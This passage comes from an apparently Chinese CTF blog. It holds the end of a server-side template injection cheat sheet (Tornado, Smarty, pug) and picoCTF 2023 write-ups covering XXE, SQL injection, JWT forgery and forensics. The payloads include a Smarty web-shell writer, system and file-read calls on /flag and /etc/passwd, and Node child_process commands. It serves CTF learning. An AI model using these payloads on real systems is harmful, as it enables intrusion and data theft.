function_">ord</span>(<span class="hljs-variable">c</span>)) <span class="hljs-keyword">for</span> <span class="hljs-variable">c</span> <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;</span>]))<br>&#123;<span class="hljs-operator">%</span> <span class="hljs-variable">raw</span> <span class="hljs-string">&quot;\x5f\x5f<span class="hljs-char escape_">\x69</span>\x6d<span class="hljs-char escape_">\x70</span>\x6f<span class="hljs-char escape_">\x72</span><span class="hljs-char escape_">\x74</span>\x5f\x5f<span class="hljs-char escape_">\x28</span><span class="hljs-char escape_">\x27</span>\x6f<span class="hljs-char escape_">\x73</span><span class="hljs-char escape_">\x27</span><span class="hljs-char escape_">\x29</span>\x2e<span class="hljs-char escape_">\x70</span>\x6f<span class="hljs-char escape_">\x70</span><span class="hljs-char escape_">\x65</span>\x6e<span class="hljs-char escape_">\x28</span><span class="hljs-char escape_">\x27</span>\x6c<span class="hljs-char escape_">\x73</span><span class="hljs-char escape_">\x27</span><span class="hljs-char escape_">\x29</span>\x2e<span class="hljs-char escape_">\x72</span><span class="hljs-char escape_">\x65</span><span class="hljs-char escape_">\x61</span><span class="hljs-char escape_">\x64</span><span class="hljs-char escape_">\x28</span><span class="hljs-char escape_">\x29</span>&quot;</span><span class="hljs-operator">%</span><span class="hljs-number">0</span>a    <span class="hljs-variable">_tt_utf8</span> <span class="hljs-operator">=</span> <span class="hljs-variable">eval</span><span class="hljs-operator">%</span>&#125;&#123;&#123;&#x27;<span class="hljs-number">1</span>&#x27;<span class="hljs-operator">%</span><span class="hljs-number">0</span>a    <span class="hljs-variable">_tt_utf8</span> <span class="hljs-operator">=</span> <span class="hljs-variable">str</span>&#125;&#125;<br></code></pre></td></tr></table></figure><h3 id="php类"><a class="markdownIt-Anchor" href="#php类"></a> php类</h3><h4 id="smarty模板注入"><a class="markdownIt-Anchor" href="#smarty模板注入"></a> Smarty模板注入</h4><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="hljs-template-variable">&#123;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;**&#125;</span><span class="language-xml"> #注释符</span><br></code></pre></td></tr></table></figure><p>产生漏洞的代码，直接将用户的输入</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-keyword">require_once</span>(<span class="hljs-string">&#x27;./smarty/libs/&#x27;</span> . <span class="hljs-string">&#x27;Smarty.class.php&#x27;</span>);<br>    <span class="hljs-variable">$smarty</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Smarty</span>();<br>    <span class="hljs-variable">$ip</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>];<br>    <span class="hljs-variable">$smarty</span>-&gt;<span class="hljs-title function_ invoke__">display</span>(<span class="hljs-string">&quot;string:&quot;</span>.<span class="hljs-variable">$ip</span>);     <span class="hljs-comment">// display函数把标签替换成对象的php变量；显示模板</span><br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">&#123;<span class="hljs-variable">$smarty</span>.version&#125; <span class="hljs-comment">#查看smarty版本</span><br>&#123;<span class="hljs-variable">$smarty</span>.template&#125; <span class="hljs-comment">#返回当前模板的文件名</span><br>&#123;phpinfo()&#125;<br>&#123;self::getStreamVariable(<span class="hljs-string">&quot;file:///etc/passwd&quot;</span>)&#125; 版本&lt;3.1.30<br>&#123;Smarty_Internal_Write_File::writeFile(<span class="hljs-variable">$SCRIPT_NAME</span>,<span class="hljs-string">&quot;&lt;?php passthru(<span class="hljs-variable">$_GET</span>[&#x27;cmd&#x27;]); ?&gt;&quot;</span>,self::clearConfig())&#125;<br>&#123;<span class="hljs-keyword">if</span> phpinfo()&#125;&#123;/if&#125;<br>&#123;<span class="hljs-keyword">if</span> readfile (<span class="hljs-string">&#x27;/flag&#x27;</span>)&#125;&#123;/if&#125;<br>&#123;<span class="hljs-keyword">if</span> show_source(<span class="hljs-string">&#x27;/flag&#x27;</span>)&#125;&#123;/if&#125;<br>&#123;<span class="hljs-keyword">if</span> system(<span class="hljs-string">&#x27;cat /flag&#x27;</span>)&#125;&#123;/if&#125;<br>&#123;php&#125;phpinfo();&#123;/php&#125; 版本&lt;3<br>&#123;literal&#125;&lt;script&gt;alert(<span class="hljs-string">&#x27;xss&#x27;</span>);&lt;/script&gt;&#123;/literal&#125; <span class="hljs-comment">#用于xss</span><br></code></pre></td></tr></table></figure><p>常见注入点:</p><ol><li>post <code>data</code></li><li>XFF</li></ol><p><a href="https://xz.aliyun.com/t/11108">几个cve</a></p><p><a href="https://xz.aliyun.com/t/12220">https://xz.aliyun.com/t/12220</a></p><h3 id="nodejs"><a class="markdownIt-Anchor" href="#nodejs"></a> nodejs</h3><h4 id="pugjs"><a class="markdownIt-Anchor" href="#pugjs"></a> pugjs</h4><figure class="highlight gml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gml">#&#123;<span class="hljs-number">7</span>*<span class="hljs-number">7</span>&#125;<br>#&#123;this.<span class="hljs-symbol">global</span>.process.mainModule.require(<span class="hljs-string">&quot;child_process&quot;</span>).execSync(<span class="hljs-string">&#x27;cat /flag&#x27;</span>)&#125;<br>#&#123;<span class="hljs-keyword">function</span>()&#123;localLoad=<span class="hljs-symbol">global</span>.process.mainModule.<span class="hljs-keyword">constructor</span>._load;sh=localLoad(<span class="hljs-string">&quot;child_process&quot;</span>).exec(<span class="hljs-string">&#x27;touch /tmp/pwned.txt&#x27;</span>)&#125;()&#125;<br></code></pre></td></tr></table></figure><p><a href="https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection">https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection</a></p><h3 id="c类"><a class="markdownIt-Anchor" href="#c类"></a> C#类</h3><h4 id="razor"><a class="markdownIt-Anchor" href="#razor"></a> Razor</h4><p><a href="https://book.hacktricks.xyz/v/cn/pentesting-web/ssti-server-side-template-injection">https://book.hacktricks.xyz/v/cn/pentesting-web/ssti-server-side-template-injection</a></p><p>一道例题（TUCTF）</p><p><a href="https://github.com/4n86rakam1/writeup/blob/main/TUCTF_2023/Web/Aspiring_Calculator/index.md">https://github.com/4n86rakam1/writeup/blob/main/TUCTF_2023/Web/Aspiring_Calculator/index.md</a></p><h3 id="参考资料"><a class="markdownIt-Anchor" href="#参考资料"></a> <em>参考资料</em></h3><p><em><a href="https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection">https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection</a></em></p><p><em><a href="https://tyskill.github.io/posts/flaskssti/">https://tyskill.github.io/posts/flaskssti/</a></em></p><p><em><a href="https://tttang.com/archive/1698/#toc">https://tttang.com/archive/1698/#toc</a></em></p><p><em><a href="https://blog.csdn.net/miuzzx/article/details/123329244">https://blog.csdn.net/miuzzx/article/details/123329244</a></em></p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>picoCTF2023</title>
    <link href="/2023/03/20/picoCTF2023/"/>
    <url>/2023/03/20/picoCTF2023/</url>
    
    <content type="html"><![CDATA[<h3 id="0x00findme"><a class="markdownIt-Anchor" href="#0x00findme"></a> 0x00findme</h3><p>重定向页面有base64编码：cGljb0NURntwcm94aWVzX2FsbF90aGVfd2F5XzM5Mjg2Yzk3fQ==  （要两次才能凑齐）</p><p>解码后得到<code>picoCTF&#123;proxies_all_the_way_39286c97&#125;</code></p><img src="/2023/03/20/picoCTF2023/1.png" class=""><h3 id="0x01matchtheregex"><a class="markdownIt-Anchor" href="#0x01matchtheregex"></a> 0x01MatchTheRegex</h3><p>考一个正则匹配，查看页面源码可以看到匹配内容</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">send_request</span>(<span class="hljs-params"></span>) &#123;<br><span class="hljs-keyword">let</span> val = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;name&quot;</span>).<span class="hljs-property">value</span>;<br><span class="hljs-comment">// ^p.....F!?</span><br><span class="hljs-title function_">fetch</span>(<span class="hljs-string">`/flag?input=<span class="hljs-subst">$&#123;val&#125;</span>`</span>)<br>.<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">res</span> =&gt;</span> res.<span class="hljs-title function_">text</span>())<br>.<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">res</span> =&gt;</span> &#123;<br><span class="hljs-keyword">const</span> res_json = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(res);<br><span class="hljs-title function_">alert</span>(res_json.<span class="hljs-property">flag</span>)<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;)<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>输入<code>picoCTF</code>即可</p><img src="/2023/03/20/picoCTF2023/2.png" class=""><h3 id="0x02soap"><a class="markdownIt-Anchor" href="#0x02soap"></a> 0x02SOAP</h3><p>提示是XML外部实体注入,并且要读取/etc/passwd文件</p><p>抓包可以发现点击<code>Details</code>之后有xml</p><p>直接进行注入</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">data</span>[</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">data</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">ID</span>&gt;</span><br>        <span class="hljs-symbol">&amp;xxe;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">ID</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">data</span>&gt;</span><br></code></pre></td></tr></table></figure><img src="/2023/03/20/picoCTF2023/3.png" class=""><h3 id="0x03more-sqli"><a class="markdownIt-Anchor" href="#0x03more-sqli"></a> 0x03More SQLi</h3><p>sql注入,常规试一下</p><img src="/2023/03/20/picoCTF2023/4.png" class=""><p>发现是password and username,所以注入点应该在password</p><img src="/2023/03/20/picoCTF2023/5.png" class=""><h3 id="0x04java-code-analysis"><a class="markdownIt-Anchor" href="#0x04java-code-analysis"></a> 0x04Java Code Analysis!?!</h3><p>把源码下载下来</p><p>提示要找到<code> the JWT Signing Key (&quot;secret key&quot;)</code></p><p>可以在源文件中找到<code>JwtService.java</code>,</p><p>有这样一段源码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Autowired</span><br> <span class="hljs-keyword">public</span> <span class="hljs-title function_">JwtService</span><span class="hljs-params">(SecretGenerator secretGenerator)</span>&#123;<br>     <span class="hljs-built_in">this</span>.SECRET_KEY = secretGenerator.getServerSecret();<br> &#125;<br></code></pre></td></tr></table></figure><p><code>secret key</code> 是由<code>secretGenerator</code>产生，看到<code>SecretGenerator.java</code></p><p>密钥放在<code>server_secret.txt</code>里面，当没有这个文件时密钥为<code>1234</code></p><p>先抓一下包，发现JWT,<a href="https://jwt.io/">JWT解码</a></p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">Authorization:</span> Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiRnJlZSIsImlzcyI6ImJvb2tzaGVsZiIsImV4cCI6MTY3OTkxNDQ1MCwiaWF0IjoxNjc5MzA5NjUwLCJ1c2VySWQiOjEsImVtYWlsIjoidXNlciJ9.Y5f4P9ivWsO5AqnXstKtUKyY02s8y8PL9L2msCAkhiI<br></code></pre></td></tr></table></figure><img src="/2023/03/20/picoCTF2023/6.png" class=""><p>根据提示要修改 ‘role’ and ‘userId’，而且要使用密钥<code>1234</code></p><img src="/2023/03/20/picoCTF2023/7.png" class=""><p><code>eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiRnJlZSIsImlzcyI6ImJvb2tzaGVsZiIsImV4cCI6MTY3OTkxNDQ1MCwiaWF0IjoxNjc5MzA5NjUwLCJ1c2VySWQiOjIsImVtYWlsIjoiYWRtaW4ifQ.g7dC751n3puM1TmnXbihfTGNED5EHyq6EmiQ9Gl4Dzs</code></p><p>接下来只要访问到flag对应的pdf就应该可以了</p><p>试了几次发现直接访问flag访问不到</p><p>第一个是user就能访问的，可以发现pdf所在路径为<code>/base/books/pdf/3</code></p><p>顺过去flag应该就是访问<code>/base/books/pdf/5</code></p><p>然后就出flag啦</p><img src="/2023/03/20/picoCTF2023/8.png" class=""><h3 id="0x05hidetosee"><a class="markdownIt-Anchor" href="#0x05hidetosee"></a> 0x05HideToSee</h3><img src="/2023/03/20/picoCTF2023/atbash.jpg" class=""><p>提示<code>ectract</code>，想到linux有一个工具<code>strghide</code></p><p><code>steghide extract -sf atbash.jpg</code></p><p>提取到<code>xqkwKBN&#123;z0bib1wv_l3kzgxb3l_k34ijli2&#125;</code></p><p>然后利用<a href="https://www.dcode.fr/atbash-cipher">在线网站</a>或者手动解密</p><p><code>picoCTF&#123;atbash_crack_1f84d779&#125;</code></p><h3 id="0x06readmycert"><a class="markdownIt-Anchor" href="#0x06readmycert"></a> 0x06ReadMyCert</h3><p>下载源件是一个证书</p><p>用openssl</p><p><code>openssl req -noout -text -in readmycert.csr</code></p><p>flag<code>picoCTF&#123;read_mycert_aac33761&#125;</code></p><h3 id="0x07rotation"><a class="markdownIt-Anchor" href="#0x07rotation"></a> 0x07rotation</h3><p>凯撒加密</p><img src="/2023/03/20/picoCTF2023/9.png" class=""><h3 id="0x08reverse"><a class="markdownIt-Anchor" href="#0x08reverse"></a> 0x08Reverse</h3><h3 id="0x09safe-opener-2"><a class="markdownIt-Anchor" href="#0x09safe-opener-2"></a> 0x09Safe Opener 2</h3><p>这两道ida打开直接可以看到flag</p><h3 id="0x0a-hideme"><a class="markdownIt-Anchor" href="#0x0a-hideme"></a> 0x0A hideme</h3><p>binwalk 一下发现有隐藏多个文件</p><p>foremost一下出flag</p><img src="/2023/03/20/picoCTF2023/10.png" class=""><h3 id="0x0bpcappoisoning"><a class="markdownIt-Anchor" href="#0x0bpcappoisoning"></a> 0x0BPcapPoisoning</h3><p>直接搜pico就看到了</p><img src="/2023/03/20/picoCTF2023/11.png" class=""><h3 id="0x0cwho-is-it"><a class="markdownIt-Anchor" href="#0x0cwho-is-it"></a> 0x0Cwho is it</h3><p>下载到一封邮件，直接看邮件头</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><code class="hljs applescript">Delivered-To: francismanzi@gmail.com<br>Received: <span class="hljs-keyword">by</span> <span class="hljs-number">2002</span>:ab0:<span class="hljs-number">638</span>a:<span class="hljs-number">0</span>:<span class="hljs-number">0</span>:<span class="hljs-number">0</span>:<span class="hljs-number">0</span>:<span class="hljs-number">0</span> <span class="hljs-keyword">with</span> SMTP <span class="hljs-built_in">id</span> y10csp123720uao;<br>        Thu, <span class="hljs-number">7</span> Jul <span class="hljs-number">2022</span> <span class="hljs-number">23</span>:<span class="hljs-number">19</span>:<span class="hljs-number">48</span> <span class="hljs-number">-0700</span> (PDT)<br>X-Google-Smtp-Source: AGRyM1u8MgQ0wT0JmPs4nZbKyuwluXeP+mglR/hb66VElgQnwB8M2ofwYUFsHj+eMYBFAVDPITJc<br>X-Received: <span class="hljs-keyword">by</span> <span class="hljs-number">2002</span>:a5d:<span class="hljs-number">6</span>d06:<span class="hljs-number">0</span>:b0:<span class="hljs-number">21</span>b:c434:d99e <span class="hljs-keyword">with</span> SMTP <span class="hljs-built_in">id</span> e6<span class="hljs-number">-20020</span>a5d6d06000000b0021bc434d99emr1524437wrq<span class="hljs-number">.148</span><span class="hljs-number">.1657261188086</span>;<br>        Thu, <span class="hljs-number">07</span> Jul <span class="hljs-number">2022</span> <span class="hljs-number">23</span>:<span class="hljs-number">19</span>:<span class="hljs-number">48</span> <span class="hljs-number">-0700</span> (PDT)<br>ARC-Seal: i=<span class="hljs-number">1</span>; a=rsa-sha256; t=<span class="hljs-number">1657261188</span>; cv=none;<br>        d=google.com; s=arc<span class="hljs-number">-20160816</span>;<br>        b=FJZQS4geDnyabQ7SUhA2v3roEqcufLmysXkLoRZd3yNXiNQFBFmwm5v5yANvDyyebA<br>         Jfjqv5X8Gujll585xj/MHlVhlEMg0edNWuwnLXj8SmNuPI1Jon9N+fokhSMxy2WxSACE<br>         <span class="hljs-number">4</span>MruPo5QBlHdrFq8WNBAFgC1VtO0nR+BQYY18wqotLIQPvkXo3yOUUhx0D+ZjUwXvTKV<br>         yUFGdYulF58Lg7wAH/cLWROIHrraWTSsmaGWoYv577nztzueoG5RC5uUAGIAyzsJRqsV<br>         dCsapFxCUlbYbAgIVraylksCA+veFXfil6ocym8KKnls3j40Vojv0VLhHHZxXruG5x/K<br>         M5cQ==<br>ARC-Message-Signature: i=<span class="hljs-number">1</span>; a=rsa-sha256; c=relaxed/relaxed; d=google.com; s=arc<span class="hljs-number">-20160816</span>;<br>        h=mime-<span class="hljs-built_in">version</span>:message-<span class="hljs-built_in">id</span>:<span class="hljs-built_in">date</span>:subject:<span class="hljs-keyword">to</span>:<span class="hljs-keyword">from</span>:dkim-signature;<br>        bh=RneTbuEOZUlwei4ZNPvzjmZpQE92irBmuzImA33zPEc=;<br>        b=RUd+ycq1YWbRNn9wB8UgJ8dZz0tHpvmqcEGQkWqzLy/<span class="hljs-number">6</span>j3aFzaf7dwdoCtXjTTtrrE<br>         z9g498cmB55fs0x1CAjtzI+Nctb1cbPcnfMCrfsF3LwgYhCErFRnbBbOgqw4eeEB+hk0<br>         sKBN0QVpSLs1HlF8ZK3XiMKA2p3vSgHlbhMDPGnFTLHEQjlM63d/L30Rt8mpQsT77ni/<br>         f6X0TqTi4Y8ARIuEELMa6m5E5wQcfUxeUU5WAssz46tQyHKR6xg/g8K2zES+gSNymASk<br>         c5Eaq55k4Zi8dXWaPIwg4IdhVLVxe4llMx8c46GTdh8tvdMtmjME3wIaFR6Q2SLWRSZA<br>         o0hw==<br>ARC-Authentication-Results: i=<span class="hljs-number">1</span>; mx.google.com;<br>       dkim=pass header.i=@onionmail.org header.s=jan2022 header.b=<span class="hljs-number">4</span>sU2nk5Z;<br>       spf=pass (google.com: domain <span class="hljs-keyword">of</span> lpage@onionmail.org designates <span class="hljs-number">173.249</span><span class="hljs-number">.33</span><span class="hljs-number">.206</span> <span class="hljs-keyword">as</span> permitted sender) smtp.mailfrom=lpage@onionmail.org;<br>       dmarc=pass (p=NONE sp=NONE dis=NONE) header.<span class="hljs-keyword">from</span>=onionmail.org<br>Return-Path: &lt;lpage@onionmail.org&gt;<br>Received: <span class="hljs-keyword">from</span> mail.onionmail.org (mail.onionmail.org. [<span class="hljs-number">173.249</span><span class="hljs-number">.33</span><span class="hljs-number">.206</span>])<br>        <span class="hljs-keyword">by</span> mx.google.com <span class="hljs-keyword">with</span> ESMTPS <span class="hljs-built_in">id</span> f16<span class="hljs-number">-20020</span>a05600c4e9000b003a1947873d6si1882702wmq<span class="hljs-number">.224</span><span class="hljs-number">.2022</span><span class="hljs-number">.07</span><span class="hljs-number">.07</span><span class="hljs-number">.23</span><span class="hljs-number">.19</span><span class="hljs-number">.47</span><br>        <span class="hljs-keyword">for</span> &lt;francismanzi@gmail.com&gt;<br>        (<span class="hljs-built_in">version</span>=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=<span class="hljs-number">256</span>/<span class="hljs-number">256</span>);<br>        Thu, <span class="hljs-number">07</span> Jul <span class="hljs-number">2022</span> <span class="hljs-number">23</span>:<span class="hljs-number">19</span>:<span class="hljs-number">47</span> <span class="hljs-number">-0700</span> (PDT)<br>Received-SPF: pass (google.com: domain <span class="hljs-keyword">of</span> lpage@onionmail.org designates <span class="hljs-number">173.249</span><span class="hljs-number">.33</span><span class="hljs-number">.206</span> <span class="hljs-keyword">as</span> permitted sender) client-ip=<span class="hljs-number">173.249</span><span class="hljs-number">.33</span><span class="hljs-number">.206</span>;<br>Authentication-Results: mx.google.com;<br>       dkim=pass header.i=@onionmail.org header.s=jan2022 header.b=<span class="hljs-number">4</span>sU2nk5Z;<br>       spf=pass (google.com: domain <span class="hljs-keyword">of</span> lpage@onionmail.org designates <span class="hljs-number">173.249</span><span class="hljs-number">.33</span><span class="hljs-number">.206</span> <span class="hljs-keyword">as</span> permitted sender) smtp.mailfrom=lpage@onionmail.org;<br>       dmarc=pass (p=NONE sp=NONE dis=NONE) header.<span class="hljs-keyword">from</span>=onionmail.org<br>DKIM-Signature: v=<span class="hljs-number">1</span>; a=rsa-sha256; c=relaxed/relaxed; d=onionmail.org;<br> q=dns/txt; s=jan2022; bh=RneTbuEOZUlwei4ZNPvzjmZpQE92irBmuzImA33zPEc=;<br> h=<span class="hljs-keyword">from</span>:subject:<span class="hljs-built_in">date</span>:message-<span class="hljs-built_in">id</span>:<span class="hljs-keyword">to</span>:mime-<span class="hljs-built_in">version</span>:content-type;<br> b=<span class="hljs-number">4</span>sU2nk5ZG4F9+lCtCPU4nat6ovALqfOHOUM1/wTskeMdmMAa2yOMXy0GkqolIioL8nG0mRG45<br> OD8b/nHZZEiA0aQppYHECSmXE7IFIFm/MP9wmXIlC/cDF1t9mEwumdDbes7hRhiO6q3A0wYWK+J<br> C+qwHI99irsPhWZOptVVh0HV/HJPAtkzg7OBMX/oPDUSG3xo7dJvT5MCYUm2+<span class="hljs-number">4</span>CBVjvLmEPUVTO<br> uuVEU3HjVjumry5zw1H4s+o9jxCOwpT41uL94NM64Aki4+KIlS75W8Uo1YStqciHSHoEPLMvBhK<br> OMfwhI02u5oLFbk6ZvmhyK5juc54lGbWgk277N0hB0Aw==<br>Received: <span class="hljs-keyword">from</span> localhost<br> <span class="hljs-keyword">by</span> mail.onionmail.org (ZoneMTA) <span class="hljs-keyword">with</span> API <span class="hljs-built_in">id</span> <span class="hljs-number">181</span>dc76dff2000ccee<span class="hljs-number">.001</span><br> <span class="hljs-keyword">for</span> &lt;francismanzi@gmail.com&gt;;<br> Fri, <span class="hljs-number">08</span> Jul <span class="hljs-number">2022</span> <span class="hljs-number">06</span>:<span class="hljs-number">19</span>:<span class="hljs-number">47</span> +<span class="hljs-number">0000</span><br>X-Zone-Loop: <span class="hljs-number">83440723</span>a48cf749c9e7702024ee772d7cb2fb7cab7a<br>Content-Type: multipart/mixed; boundary=<span class="hljs-string">&quot;--_NmP-426c22a2e0d8fc9a-Part_1&quot;</span><br>From: Larry Page &lt;lpage@onionmail.org&gt;<br>To: francismanzi@gmail.com<br>Subject: One million Prize<br>Date: Fri, <span class="hljs-number">08</span> Jul <span class="hljs-number">2022</span> <span class="hljs-number">06</span>:<span class="hljs-number">19</span>:<span class="hljs-number">47</span> +<span class="hljs-number">0000</span><br>Message-ID: &lt;<span class="hljs-number">03</span>c11cd1<span class="hljs-number">-8</span>fd9<span class="hljs-number">-584</span>e-c9d7-e53df0faeccc@onionmail.org&gt;<br>MIME-Version: <span class="hljs-number">1.0</span><br><br><span class="hljs-comment">----_NmP-426c22a2e0d8fc9a-Part_1</span><br>Content-Type: multipart/alternative;<br> boundary=<span class="hljs-string">&quot;--_NmP-426c22a2e0d8fc9a-Part_2&quot;</span><br><br><span class="hljs-comment">----_NmP-426c22a2e0d8fc9a-Part_2</span><br>Content-Type: <span class="hljs-built_in">text</span>/plain; charset=utf<span class="hljs-number">-8</span><br>Content-Transfer-Encoding: quoted-printable<br><br>Hello dear user, I am Larry Page <span class="hljs-keyword">and</span> I am delighted <span class="hljs-keyword">to</span> announce <span class="hljs-keyword">to</span> you <span class="hljs-keyword">that</span>=<br> you<br>are <span class="hljs-keyword">the</span> <span class="hljs-number">99999999</span>th GMAIL account <span class="hljs-keyword">and</span> <span class="hljs-keyword">for</span> <span class="hljs-keyword">that</span> we want <span class="hljs-keyword">to</span> reward you. =<br>You&#x27;ve<br>earned $<span class="hljs-number">1</span>,<span class="hljs-number">000</span>,<span class="hljs-number">000.</span> To claim your prize open <span class="hljs-keyword">the</span> attached <span class="hljs-built_in">file</span>.<br><span class="hljs-comment">----_NmP-426c22a2e0d8fc9a-Part_2</span><br>Content-Type: <span class="hljs-built_in">text</span>/html; charset=utf<span class="hljs-number">-8</span><br>Content-Transfer-Encoding: quoted-printable<br><br>&lt;p&gt;Hello dear user, I am Larry Page <span class="hljs-keyword">and</span> I am delighted <span class="hljs-keyword">to</span> announce <span class="hljs-keyword">to</span> you =<br><span class="hljs-keyword">that</span> you are <span class="hljs-keyword">the</span> <span class="hljs-number">99999999</span>th GMAIL account <span class="hljs-keyword">and</span> <span class="hljs-keyword">for</span> <span class="hljs-keyword">that</span> we want <span class="hljs-keyword">to</span> reward =<br>you. You&#x27;ve earned $<span class="hljs-number">1</span>,<span class="hljs-number">000</span>,<span class="hljs-number">000.</span> To claim your prize open <span class="hljs-keyword">the</span> attached <span class="hljs-built_in">file</span>.=<br>&lt;br&gt;&lt;/p&gt;<br><span class="hljs-comment">----_NmP-426c22a2e0d8fc9a-Part_2--</span><br><br><span class="hljs-comment">----_NmP-426c22a2e0d8fc9a-Part_1</span><br>Content-Type: <span class="hljs-built_in">text</span>/plain; <span class="hljs-built_in">name</span>=attachment.txt<br>Content-Transfer-Encoding: base64<br>Content-Disposition: attachment; filename=attachment.txt<br><br>QW1vdW50OiAgJDEsMDAwLDAwMAo=<br><span class="hljs-comment">----_NmP-426c22a2e0d8fc9a-Part_1--</span><br></code></pre></td></tr></table></figure><p>分析一下发现邮件是来自ip<code>173.249.33.206</code></p><p>用<code>whois</code>命令</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">whois</span> <span class="hljs-number">173.249.33.206</span><br></code></pre></td></tr></table></figure><img src="/2023/03/20/picoCTF2023/12.png" class=""><h3 id="0x0dfindandopen"><a class="markdownIt-Anchor" href="#0x0dfindandopen"></a> 0x0DFindAndOpen</h3><p>在第48个数据包发现base64编码</p><img 